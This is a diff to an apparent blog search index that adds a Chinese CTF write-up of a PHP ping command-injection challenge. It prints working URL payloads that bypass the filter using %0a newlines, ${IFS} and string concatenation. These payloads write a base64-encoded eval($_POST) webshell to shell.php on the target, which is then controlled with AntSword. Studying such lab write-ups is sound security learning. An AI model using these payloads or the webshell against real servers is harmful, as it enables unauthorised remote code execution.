-            <tag> 渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>绕过</tag>
+        <tag>命令执行</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>竞赛课-WEB5</title>
+    <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
+    <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
+<p>先看题目说了什么</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p>
+<p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64后</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问base64.txt</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p>
+<p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑进行连接</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p>
+<p>成功连接后访问根目录</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p>
+<p>获得flag</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
+        <tag>CTF</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
 </search>
